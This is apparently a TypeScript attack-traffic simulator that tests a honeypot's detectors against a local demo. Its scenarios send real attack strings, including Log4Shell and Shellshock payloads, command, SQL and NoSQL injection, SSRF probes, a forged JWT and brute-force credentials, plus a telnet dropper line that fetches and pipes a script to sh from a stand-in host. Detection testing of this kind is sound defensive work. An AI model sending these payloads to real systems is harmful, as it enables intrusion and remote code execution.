#!/usr/bin/env tsx
/**
 * Attack traffic simulator.
 *
 *   npm run demo                         # terminal 1
 *   npm run simulate                     # terminal 2: every scenario
 *   npm run simulate -- web-shell        # one scenario
 *   npm run simulate:list                # what there is
 *   npm run simulate:corpus              # the traffic corpus, over real sockets
 *
 * Points a range of attacks at the demo — decoy probes, injection payloads, forged
 * identities, brute force against every protocol honeypot — and then asks the demo's
 * management API what the honeypot concluded about each, so every scenario ends with the
 * detectors it expected and the ones that actually fired.
 *
 * It has two modes. The **scenarios** are written to be read: each names the detector it
 * exercises and uses a payload real tooling sends. **Corpus replay** (`--corpus`) sends the
 * labelled traffic corpus down the same sockets, which tests more than the in-process corpus
 * run can: the HTTP front end, Node's header parsing, whether wire order survives into
 * `rawHeaders`, and address resolution through `X-Forwarded-For`. A case that passes
 * in-process and fails on the wire has found a front-end bug.
 *
 * Every scenario runs from its own source address. That works only against a target that
 * trusts `X-Forwarded-For`, which the demo does and the shipped service, correctly, does not:
 * against it every scenario lands on one address, that address is blocked during the first
 * scenario, and the rest of the run is answered by the block. The run says so when it happens.
 */
import net from "node:net";
import { setTimeout as delay } from "node:timers/promises";
import { Client } from "ssh2";

const BASE = new URL(process.env.HONEYPOT_URL ?? "http://127.0.0.1:4004");
const HOST = BASE.hostname;
const HTTP_PORT = Number(BASE.port || 80);
const MGMT = (process.env.MGMT_URL ?? "http://127.0.0.1:9500").replace(/\/$/, "");
const MGMT_KEY = process.env.MGMT_API_KEY ?? "dev-key";
const GUI_PORT = process.env.GUI_PORT ?? "9501";
const HONEYTOKEN = process.env.HONEYTOKEN ?? "AKIA_HACKERPOT_HONEYTOKEN_DEMO";
const TRAP_PATH = process.env.TRAP_PATH ?? "/internal/export.csv";

// ---------------------------------------------------------------------------
// A minimal HTTP/1.1 client with full control over the header set, its order and its
// framing. Node's fetch adds headers of its own and refuses to send the ones these attacks
// are made of (a second Host, Content-Length beside Transfer-Encoding, an absolute target).
// ---------------------------------------------------------------------------

type Header = readonly [name: string, value: string];

interface Reply {
  status: number | undefined;
  ms: number;
  error?: string;
}

/**
 * A fresh /24 per run, from the shared-address space (RFC 6598). The demo remembers every
 * score and block for as long as it runs, so a second run from the same addresses would be
 * answered by the first run's blocks rather than by any detector.
 */
const RUN_PREFIX = `100.${64 + Math.floor(Math.random() * 64)}.${Math.floor(Math.random() * 256)}`;
let sourceIp = `${RUN_PREFIX}.10`;
let blocked = 0;
let answered = 0;

function send(method: string, target: string, headers: readonly Header[] = [], body = "", options: { host?: string | false; forwardedFor?: string; timeoutMs?: number } = {}): Promise<Reply> {
  const started = Date.now();
  return new Promise((resolve) => {
    const socket = net.createConnection({ host: HOST, port: HTTP_PORT });
    let data = "";
    let settled = false;
    const finish = (reply: Reply): void => {
      if (settled) return;
      settled = true;
      socket.destroy();
      if (reply.status !== undefined) {
        answered += 1;
        if (reply.status === 403) blocked += 1;
      }
      resolve(reply);
    };
    // A tarpit or drip-feed holds the connection on purpose; the status line has already
    // arrived by then, and it is all this needs.
    socket.setTimeout(options.timeoutMs ?? 4_000, () => finish({ status: statusOf(data), ms: Date.now() - started, ...(statusOf(data) === undefined ? { error: "held open (tarpit?)" } : {}) }));
    socket.on("error", (err) => finish({ status: undefined, ms: Date.now() - started, error: err.message }));
    socket.on("data", (chunk: Buffer) => {
      data += chunk.toString("latin1");
      if (statusOf(data) !== undefined) finish({ status: statusOf(data), ms: Date.now() - started });
    });
    socket.on("close", () => finish({ status: statusOf(data), ms: Date.now() - started }));
    socket.on("connect", () => {
      const lines = [
        `${method} ${target} HTTP/1.1`,
        ...(options.host === false ? [] : [`Host: ${options.host ?? `${HOST}:${HTTP_PORT}`}`]),
        ...headers.map(([name, value]) => `${name}: ${value}`),
        `X-Forwarded-For: ${options.forwardedFor ?? sourceIp}`,
        ...(body !== "" && !headers.some(([name]) => /^(content-length|transfer-encoding)$/i.test(name)) ? [`Content-Length: ${Buffer.byteLength(body)}`] : []),
        "Connection: close",
        "",
        body,
      ];
      socket.write(lines.join("\r\n"));
    });
  });
}

function statusOf(data: string): number | undefined {
  const match = /^HTTP\/\d\.\d (\d{3})/.exec(data);
  return match ? Number(match[1]) : undefined;
}

const CHROME: Header[] = [
  ["User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"],
  ["Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],
  ["Accept-Encoding", "gzip, deflate, br"],
  ["Accept-Language", "en-US,en;q=0.9"],
];
const CURL: Header[] = [
  ["User-Agent", "curl/8.4.0"],
  ["Accept", "*/*"],
];
const FORM: Header = ["Content-Type", "application/x-www-form-urlencoded"];
const JSON_TYPE: Header = ["Content-Type", "application/json"];

function line(label: string, reply: Reply): void {
  console.log(`    ${label.padEnd(52)} ${String(reply.status ?? "---").padStart(3)}  ${String(reply.ms).padStart(5)}ms${reply.error ? `  (${reply.error})` : ""}`);
}

// ---------------------------------------------------------------------------
// Scenarios. Each declares the detectors it expects so the run can check them.
// ---------------------------------------------------------------------------

interface Scenario {
  description: string;
  /** Detector ids this scenario should make fire, checked against the management API. */
  expects: readonly string[];
  /** Runs over HTTP from `sourceIp`, so its detections can be read back. */
  http: boolean;
  run: () => Promise<void>;
}

const b64url = (value: unknown): string => Buffer.from(JSON.stringify(value)).toString("base64url");

const scenarios: Record<string, Scenario> = {
  decoys: {
    description: "paths only an attacker would know: .env and its variants, .git, cloud credentials, framework debug endpoints",
    expects: ["decoy-path"],
    http: true,
    async run() {
      for (const path of ["/.env", "/.env.production", "/.git/config", "/.git/index", "/.aws/credentials", "/wp-login.php", "/actuator/env", "/actuator/heapdump", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]) {
        line(`GET ${path}`, await send("GET", path, CURL));
      }
    },
  },
  "path-bruteforce": {
    // A browser's headers on purpose: a walk that also announced gobuster would be blocked on
    // the tool name alone, before it had requested enough paths for this detector to see it.
    description: "a wordlist walk: twenty paths that do not exist, fast",
    expects: ["path-bruteforce"],
    http: true,
    async run() {
      for (const word of ["admin", "backup", "old", "test", "api", "dev", "staging", "hidden", "private", "secret", "tmp", "uploads", "data", "logs", "config", "db", "sql", "www", "web", "assets"]) {
        line(`GET /${word}`, await send("GET", `/${word}-${Math.random().toString(36).slice(2, 6)}`, CHROME));
      }
    },
  },
  "credential-bruteforce": {
    description: "ten guesses against one login endpoint",
    expects: ["credential-bruteforce"],
    http: true,
    async run() {
      for (let i = 0; i < 10; i++) line(`POST /login guess${i}`, await send("POST", "/login", [...CHROME, FORM], `username=admin&password=guess${i}`));
    },
  },
  "rate-spike": {
    description: "eighty requests at once from one address",
    expects: ["rate-spike"],
    http: true,
    async run() {
      const started = Date.now();
      const replies = await Promise.all(Array.from({ length: 80 }, () => send("GET", "/", CHROME)));
      console.log(`    sent 80 requests in ${Date.now() - started}ms; ${replies.filter((reply) => reply.status !== 404).length} drew something other than a 404`);
    },
  },
  "scanner-signature": {
    description: "tools that announce themselves in the User-Agent",
    expects: ["scanner-signature"],
    http: true,
    async run() {
      for (const ua of ["sqlmap/1.7.2#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)", "gobuster/3.6", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"]) {
        line(`UA ${ua.slice(0, 44)}`, await send("GET", "/", [["User-Agent", ua]]));
      }
    },
  },
  "payload-injection": {
    description: "traversal, SQL injection, XSS, Log4Shell and command injection",
    expects: ["payload-injection"],
    http: true,
    async run() {
      line("traversal in a query", await send("GET", `/files?path=${encodeURIComponent("../../../../etc/passwd")}`, CURL));
      line("UNION SELECT in a query", await send("GET", `/search?q=${encodeURIComponent("' UNION SELECT username,password FROM users--")}`, CURL));
      line("script tag in a query", await send("GET", `/page?name=${encodeURIComponent("<script>document.cookie</script>")}`, CURL));
      line("Log4Shell in the User-Agent", await send("GET", "/", [["User-Agent", "${jndi:ldap://evil.example/a}"]]));
      line("command injection in a JSON body", await send("POST", "/api/run", [...CURL, JSON_TYPE], JSON.stringify({ cmd: "; cat /etc/passwd" })));
    },
  },
  "suspicious-method": {
    description: "verbs no browser sends",
    expects: ["suspicious-method"],
    http: true,
    async run() {
      for (const method of ["PROPFIND", "TRACE", "MKCOL"]) line(method, await send(method, "/", CURL));
    },
  },
  "sensitive-file": {
    description: "backup, dump, source and version-control files",
    expects: ["sensitive-file"],
    http: true,
    async run() {
      for (const path of ["/wp-config.php.bak", "/index.php~", "/database.sql", "/.svn/entries", "/site-backup.tar.gz", "/.idea/workspace.xml"]) line(`GET ${path}`, await send("GET", path, CURL));
    },
  },
  "header-anomaly": {
    description: "Shellshock, request smuggling framing, an absolute-form target",
    expects: ["header-anomaly"],
    http: true,
    async run() {
      line("Shellshock in the User-Agent", await send("GET", "/cgi-bin/status", [["User-Agent", "() { :; }; /bin/bash -c id"]]));
      line("Content-Length beside Transfer-Encoding", await send("POST", "/", [...CURL, ["Content-Length", "4"], ["Transfer-Encoding", "chunked"]], "0\r\n\r\n"));
      line("absolute-form target (open proxy probe)", await send("GET", "http://example.com/", CURL));
    },
  },
  "header-integrity": {
    description: "a repeated Host header, which no client stack sends",
    expects: ["header-integrity"],
    http: true,
    async run() {
      line("two Host headers", await send("GET", "/", [["Host", "internal.example"], ...CURL]));
    },
  },
  "ssrf-probe": {
    description: "pointing the server at cloud metadata, file:// and loopback services",
    expects: ["ssrf-probe"],
    http: true,
    async run() {
      line("cloud metadata address", await send("GET", `/fetch?url=${encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/")}`, CURL));
      line("file:// scheme", await send("GET", `/preview?target=${encodeURIComponent("file:///etc/passwd")}`, CURL));
      line("loopback Redis", await send("GET", `/proxy?u=${encodeURIComponent("http://127.0.0.1:6379/")}`, CURL));
    },
  },
  "open-redirect": {
    description: "bouncing a victim off-site through a redirect parameter",
    expects: ["open-redirect"],
    http: true,
    async run() {
      line("protocol-relative //evil", await send("GET", `/login?next=${encodeURIComponent("//evil.example/phish")}`, CURL));
      line("absolute off-site URL", await send("GET", `/go?url=${encodeURIComponent("https://evil.example/account")}`, CURL));
    },
  },
  "crlf-injection": {
    description: "smuggling a header through CR/LF in a parameter",
    expects: ["crlf-injection"],
    http: true,
    async run() {
      line("Set-Cookie through a redirect parameter", await send("GET", "/redirect?to=foo%0d%0aSet-Cookie:%20admin=1", CURL));
      line("response split in a query", await send("GET", "/page?lang=en%0d%0aContent-Length:%200", CURL));
    },
  },
  "nosql-injection": {
    description: "MongoDB operators in a query key and in a login body",
    expects: ["nosql-injection"],
    http: true,
    async run() {
      line("operator in a query key", await send("GET", "/account?user[$ne]=", CURL));
      line("auth bypass {password: {$ne: null}}", await send("POST", "/login", [...CURL, JSON_TYPE], JSON.stringify({ username: "admin", password: { $ne: null } })));
    },
  },
  "graphql-abuse": {
    description: "schema introspection and a deeply nested query",
    expects: ["graphql-abuse"],
    http: true,
    async run() {
      line("introspection", await send("POST", "/graphql", [...CURL, JSON_TYPE], JSON.stringify({ query: "query IntrospectionQuery { __schema { types { name fields { name } } } }" })));
      line("depth 20", await send("POST", "/graphql", [...CURL, JSON_TYPE], JSON.stringify({ query: `query{${"wrap{".repeat(20)}id${"}".repeat(20)}}` })));
    },
  },
  "jwt-weakness": {
    description: "a forged alg:none token",
    expects: ["jwt-weakness"],
    http: true,
    async run() {
      line('alg:"none" token', await send("GET", "/api/admin", [...CURL, ["Authorization", `Bearer ${b64url({ alg: "none", typ: "JWT" })}.${b64url({ sub: "admin", role: "superuser" })}.`]]));
    },
  },
  "client-anomaly": {
    description: "a Chrome User-Agent with none of the headers Chrome sends",
    expects: ["client-anomaly"],
    http: true,
    async run() {
      line("spoofed Chrome, no Accept headers", await send("GET", "/", [CHROME[0]!]));
    },
  },
  "prototype-pollution": {
    description: "__proto__ in a query key and a JSON body",
    expects: ["prototype-pollution"],
    http: true,
    async run() {
      line("__proto__ in a query key", await send("GET", "/api/merge?a[__proto__][isAdmin]=true", CURL));
      line("__proto__ in a JSON body", await send("POST", "/api/merge", [...CURL, JSON_TYPE], '{"__proto__":{"isAdmin":true}}'));
    },
  },
  "insecure-deserialization": {
    description: "a Java serialized object in a cookie, a PHP object in a form",
    expects: ["insecure-deserialization"],
    http: true,
    async run() {
      line("Java rO0AB in a cookie", await send("GET", "/api/data", [...CURL, ["Cookie", "sess=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUKuAABAAA"]]));
      line("PHP object injection in a form", await send("POST", "/api/import", [...CURL, FORM], 'obj=O:4:"Evil":1:{s:3:"cmd";s:2:"id";}'));
    },
  },
  "host-header-injection": {
    description: "a Host header carrying a path, for password-reset poisoning",
    expects: ["host-header-injection"],
    http: true,
    async run() {
      line("Host with a path", await send("GET", "/", [["User-Agent", "mozilla"]], "", { host: "evil.example/password-reset" }));
    },
  },
  "web-shell": {
    description: "reaching for a dropped backdoor",
    expects: ["web-shell"],
    http: true,
    async run() {
      line("known web-shell filename", await send("GET", "/wso.php", CURL));
      line("script in an upload directory", await send("GET", "/uploads/avatar.php?cmd=id", CURL));
    },
  },
  honeytoken: {
    description: "replaying a credential planted in a decoy .env",
    expects: ["honeytoken"],
    http: true,
    async run() {
      line("in Authorization", await send("GET", "/api/account", [...CURL, ["Authorization", `Bearer ${HONEYTOKEN}`]]));
      line("as a Basic password", await send("GET", "/admin", [...CURL, ["Authorization", `Basic ${Buffer.from(`admin:${HONEYTOKEN}`).toString("base64")}`]]));
    },
  },
  trap: {
    description: "following a link that is hidden from people and disallowed in robots.txt",
    expects: ["trap"],
    http: true,
    async run() {
      line(`GET ${TRAP_PATH}`, await send("GET", TRAP_PATH, CHROME));
    },
  },
  "port-scan": {
    description: "sweeping the port-scan sentinels",
    expects: [],
    http: false,
    async run() {
      for (const port of (process.env.SCAN_PORTS ?? "8022,9200,7001").split(",").map((entry) => Number(entry.trim()))) {
        const started = Date.now();
        const banner = await new Promise<string>((resolve) => {
          const socket = net.createConnection({ host: HOST, port }, () => socket.write("GET / HTTP/1.0\r\n\r\n"));
          let data = "";
          socket.setTimeout(3_000, () => socket.destroy());
          socket.on("data", (chunk: Buffer) => (data += chunk.toString()));
          socket.on("close", () => resolve(data.trim()));
          socket.on("error", (err) => resolve(`error: ${err.message}`));
        });
        console.log(`    :${port} in ${Date.now() - started}ms ${banner ? JSON.stringify(banner.slice(0, 60)) : ""}`);
      }
    },
  },
  smtp: {
    description: "AUTH brute force, open relay, VRFY enumeration",
    expects: [],
    http: false,
    async run() {
      const port = Number(process.env.SMTP_PORT ?? 2525);
      const dialogue = (label: string, lines: string[]): Promise<void> =>
        new Promise((resolve) => {
          const socket = net.createConnection({ host: HOST, port });
          let transcript = "";
          socket.setTimeout(8_000, () => socket.destroy());
          socket.on("data", (chunk: Buffer) => (transcript += chunk.toString()));
          socket.on("close", () => {
            console.log(`    ${label.padEnd(30)} codes ${[...transcript.matchAll(/^(\d{3})/gm)].map((match) => match[1]).join(" ")}`);
            resolve();
          });
          socket.on("error", (err) => {
            console.log(`    ${label} error: ${err.message}`);
            resolve();
          });
          socket.on("connect", async () => {
            // The server is silent during DATA until the lone dot, so lines go on a cadence.
            await delay(200);
            for (const entry of lines) {
              socket.write(`${entry}\r\n`);
              await delay(150);
            }
            socket.end();
          });
        });
      await dialogue("AUTH LOGIN brute force", ["EHLO attacker.example", "AUTH LOGIN", Buffer.from("admin").toString("base64"), Buffer.from("P@ssw0rd").toString("base64"), "QUIT"]);
      await dialogue("open relay", ["EHLO attacker.example", "MAIL FROM:<spammer@evil.example>", "RCPT TO:<victim@elsewhere.example>", "DATA", "Subject: cheap pills", "", "buy now", ".", "QUIT"]);
      await dialogue("VRFY enumeration", ["HELO attacker.example", "VRFY root", "VRFY admin", "QUIT"]);
    },
  },
  ssh: {
    description: "password brute force",
    expects: [],
    http: false,
    async run() {
      const port = Number(process.env.SSH_PORT ?? 2222);
      for (const [username, password] of [["root", "root"], ["root", "123456"], ["admin", "admin"], ["ubuntu", "password"]] as const) {
        await new Promise<void>((resolve) => {
          const conn = new Client();
          const done = (note: string): void => {
            console.log(`    ${`${username}:${password}`.padEnd(30)} ${note}`);
            resolve();
          };
          conn.on("ready", () => {
            conn.end();
            done("accepted");
          });
          conn.on("error", (err) => done(`rejected (${err.message.split(":")[0]})`));
          conn.connect({ host: HOST, port, username, password, hostVerifier: () => true, readyTimeout: 4_000 });
        });
        await delay(120);
      }
    },
  },
  ftp: {
    description: "brute force, an FTP bounce and a traversal",
    expects: [],
    http: false,
    async run() {
      const port = Number(process.env.FTP_PORT ?? 2121);
      const dialogue = (label: string, lines: string[]): Promise<void> =>
        new Promise((resolve) => {
          const socket = net.createConnection({ host: HOST, port });
          let transcript = "";
          let next = 0;
          socket.setTimeout(8_000, () => socket.destroy());
          socket.on("data", (chunk: Buffer) => {
            transcript += chunk.toString();
            if (next < lines.length) socket.write(`${lines[next++]}\r\n`);
            else socket.end();
          });
          socket.on("close", () => {
            console.log(`    ${label.padEnd(30)} codes ${[...transcript.matchAll(/^(\d{3})/gm)].map((match) => match[1]).join(" ")}`);
            resolve();
          });
          socket.on("error", (err) => {
            console.log(`    ${label} error: ${err.message}`);
            resolve();
          });
        });
      for (const [user, pass] of [["admin", "admin"], ["root", "toor"]]) await dialogue(`brute force ${user}:${pass}`, [`USER ${user}`, `PASS ${pass}`, "QUIT"]);
      await dialogue("bounce to a third party", ["USER anonymous", "PASS x@x", "PORT 198,51,100,23,0,25", "QUIT"]);
      await dialogue("traversal", ["USER anonymous", "PASS x@x", "RETR ../../../../etc/passwd", "QUIT"]);
    },
  },
  telnet: {
    description: "the default credentials the Mirai lineage sprays, then a dropper",
    expects: [],
    http: false,
    async run() {
      const port = Number(process.env.TELNET_PORT ?? 2323);
      const commands = ["/bin/busybox ECCHI", "cat /proc/cpuinfo", "wget http://198.51.100.9/bins.sh -O - | sh", "exit"];
      for (const [user, pass] of [["root", "xc3511"], ["root", "vizxv"], ["admin", "admin"]] as const) {
        await new Promise<void>((resolve) => {
          const socket = net.createConnection({ host: HOST, port });
          let seen = "";
          let stage = 0;
          let sent = 0;
          socket.setTimeout(8_000, () => socket.destroy());
          socket.on("data", (chunk: Buffer) => {
            seen += chunk.toString("latin1");
            if (stage === 0 && seen.includes("login: ")) {
              socket.write(`${user}\r\n`);
              stage = 1;
            } else if (stage === 1 && seen.includes("Password: ")) {
              socket.write(`${pass}\r\n`);
              stage = 2;
            } else if (stage === 2 && seen.endsWith("# ") && sent < commands.length) {
              socket.write(`${commands[sent++]}\r\n`);
            } else if (stage === 2 && seen.split("Login incorrect").length > 2) {
              socket.end();
            }
          });
          socket.on("close", () => {
            console.log(`    ${`${user}:${pass}`.padEnd(30)} ${seen.includes("# ") ? `accepted, ran ${sent} command(s)` : "rejected"}`);
            resolve();
          });
          socket.on("error", (err) => {
            console.log(`    ${user}:${pass} error: ${err.message}`);
            resolve();
          });
        });
        await delay(150);
      }
    },
  },
};

// ---------------------------------------------------------------------------
// Reading back what the honeypot concluded.
// ---------------------------------------------------------------------------

interface IncidentSummary {
  detections: Array<{ detectorId: string }>;
  respondedWith: string;
}

async function incidentsFrom(ip: string): Promise<IncidentSummary[] | undefined> {
  try {
    const response = await fetch(`${MGMT}/incidents?ip=${encodeURIComponent(ip)}&limit=1000`, { headers: { authorization: `Bearer ${MGMT_KEY}` }, signal: AbortSignal.timeout(5_000) });
    if (!response.ok) return undefined;
    return ((await response.json()) as { incidents: IncidentSummary[] }).incidents;
  } catch {
    return undefined;
  }
}

async function firedFrom(ips: Iterable<string>): Promise<{ detectors: Set<string>; responses: Set<string> } | undefined> {
  const detectors = new Set<string>();
  const responses = new Set<string>();
  for (const ip of ips) {
    const incidents = await incidentsFrom(ip);
    if (incidents === undefined) return undefined;
    for (const incident of incidents) {
      responses.add(incident.respondedWith);
      for (const detection of incident.detections) detectors.add(detection.detectorId);
    }
  }
  return { detectors, responses };
}

let managementWarned = false;
function warnNoManagement(): void {
  if (managementWarned) return;
  managementWarned = true;
  console.log(`\n  (The management API at ${MGMT} did not answer, so the run cannot show what fired. Start the target with npm run demo.)`);
}

// ---------------------------------------------------------------------------
// Corpus replay.
// ---------------------------------------------------------------------------

/** Longest a case may be spread over and still replay faithfully without its own clock. */
const MAX_WIRE_SPAN_MS = 5_000;

async function replayCorpus(audience: string | undefined): Promise<void> {
  const { CORPUS, addressFor } = await import("../src/corpus/index.js");
  console.log(`\n# corpus — ${CORPUS.length} cases over raw sockets, checked against the management API at ${MGMT}\n`);
  let passed = 0;
  let failed = 0;
  const refused: string[] = [];
  const knownCosts: string[] = [];
  const skipped = new Map<string, number>();
  const skip = (why: string): void => void skipped.set(why, (skipped.get(why) ?? 0) + 1);

  for (const [index, testCase] of CORPUS.entries()) {
    if (audience !== undefined && testCase.audience !== audience) continue;
    const requires = testCase.requires ?? [];
    // The demo seeds a honeytoken and a trap path; it verifies no crawler, since that needs
    // controlled DNS or published ranges it does not load.
    if (requires.some((capability: string) => capability !== "honeytoken" && capability !== "trap")) {
      skip(`needs ${requires.filter((capability: string) => capability !== "honeytoken" && capability !== "trap").join(", ")}`);
      continue;
    }
    if ("dns" in testCase && testCase.dns !== undefined) {
      skip("declares its own DNS answers");
      continue;
    }
    if (testCase.requests.some((request) => (request.atMs ?? 0) > MAX_WIRE_SPAN_MS)) {
      skip("is paced over time, which only the in-process clock reproduces");
      continue;
    }
    if (testCase.requests.some((request) => request.httpVersion?.startsWith("2") === true)) {
      skip("is HTTP/2, which this raw HTTP/1.1 client cannot send");
      continue;
    }

    // The same addresses the in-process run uses: one /24 per case, one address per source.
    const address = (from: number | undefined): string => addressFor(index, from ?? 0);
    const sources = new Set<string>();
    const statuses: Array<number | undefined> = [];
    for (const request of testCase.requests) {
      const ip = address(request.from);
      sources.add(ip);
      statuses.push((await send(request.method ?? "GET", request.path ?? "/", request.headers, request.body ?? "", { host: false, forwardedFor: ip, timeoutMs: 1_500 })).status);
    }
    await delay(100);

    const fired = await firedFrom(sources);
    if (fired === undefined) {
      warnNoManagement();
      process.exitCode = 1;
      return;
    }
    const expected: readonly string[] = testCase.expect?.detectors ?? [];
    // Node's own HTTP parser answers some framing with 400 before any application code runs:
    // smuggling framing, a request line with no Host. Nothing reaches the honeypot, which is
    // the parser protecting the app rather than the honeypot missing an attack.
    if (fired.detectors.size === 0 && statuses.length > 0 && statuses.every((status) => status === 400)) {
      refused.push(testCase.id);
      continue;
    }
    // A documented cost is reported where it can be read, the way the in-process scorecard does.
    if (testCase.tags?.includes("known-cost") === true) {
      knownCosts.push(`${testCase.id} (fired ${[...fired.detectors].join(", ") || "nothing"})`);
      continue;
    }
    const ok = testCase.audience === "human" ? fired.detectors.size === 0 : expected.every((id) => fired.detectors.has(id));
    if (ok) passed += 1;
    else failed += 1;
    if (!ok || process.argv.includes("--verbose")) {
      console.log(`  ${ok ? "ok  " : "FAIL"} ${testCase.audience.padEnd(14)} ${testCase.id}${ok ? "" : `  expected ${expected.join(", ") || "nothing"}, fired ${[...fired.detectors].join(", ") || "nothing"}`}`);
    }
  }

  console.log(`\n  ${passed} passed, ${failed} failed on the wire.`);
  if (refused.length > 0) console.log(`  ${refused.length} refused by Node's HTTP parser before reaching the honeypot: ${refused.join(", ")}`);
  for (const cost of knownCosts) console.log(`  known cost: ${cost}`);
  for (const [why, count] of skipped) console.log(`  ${count} skipped: ${why}`);
  if (failed > 0) {
    console.log("\n  A case that passes in process and fails here has found a difference in the HTTP front end.");
    process.exitCode = 1;
  }
}

// ---------------------------------------------------------------------------

async function main(): Promise<void> {
  const args = process.argv.slice(2);
  if (args.includes("--list")) {
    for (const [name, scenario] of Object.entries(scenarios)) console.log(`${name.padEnd(26)} ${scenario.description}`);
    return;
  }
  if (args.includes("--corpus")) {
    const flag = args.indexOf("--audience");
    return replayCorpus(flag === -1 ? undefined : args[flag + 1]);
  }

  const names = args.filter((arg) => !arg.startsWith("-"));
  const unknown = names.filter((name) => !(name in scenarios));
  if (unknown.length > 0) {
    console.error(`Unknown scenario: ${unknown.join(", ")}\nRun npm run simulate:list to see them.`);
    process.exitCode = 1;
    return;
  }
  const selected = names.length > 0 ? names : Object.keys(scenarios);

  console.log(`Target ${BASE.origin} · management API ${MGMT} · dashboard http://127.0.0.1:${GUI_PORT}/`);
  let octet = 10;
  let missed = 0;
  /** Scenario addresses the management API recorded incidents for. More than one means the target trusts X-Forwarded-For. */
  let addressesSeen = 0;
  for (const name of selected) {
    const scenario = scenarios[name]!;
    sourceIp = `${RUN_PREFIX}.${octet++}`;
    console.log(`\n# ${name} — ${scenario.description}${scenario.http ? `   (from ${sourceIp})` : ""}`);
    await scenario.run();
    if (!scenario.http || scenario.expects.length === 0) continue;
    await delay(150);
    const fired = await firedFrom([sourceIp]);
    if (fired === undefined) {
      warnNoManagement();
      continue;
    }
    if (fired.detectors.size > 0) addressesSeen += 1;
    const missing = scenario.expects.filter((id) => !fired.detectors.has(id));
    if (missing.length > 0) missed += 1;
    console.log(`  → fired ${[...fired.detectors].join(", ") || "nothing"}; responded ${[...fired.responses].join(", ") || "nothing"}${missing.length > 0 ? `   MISSING ${missing.join(", ")}` : ""}`);
  }

  if (answered > 0 && blocked * 2 >= answered) {
    // Two causes look the same from here, and the advice differs, so say which one the evidence points at.
    console.log(
      addressesSeen <= 1
        ? `\n  ${blocked} of ${answered} responses were 403, and incidents were recorded for at most one scenario address: the target is not trusting X-Forwarded-For, so every scenario landed on one address and it was blocked early. Run it against npm run demo.`
        : `\n  ${blocked} of ${answered} responses were 403. Each scenario ran from its own address, so these are scenarios crossing the block threshold on their own score before every request was sent; the detections above are still what fired.`,
    );
  }
  if (missed > 0) {
    console.log(`\n  ${missed} scenario(s) did not make every expected detector fire.`);
    process.exitCode = 1;
  }
}

main().catch((err: unknown) => {
  console.error(err);
  process.exitCode = 1;
});
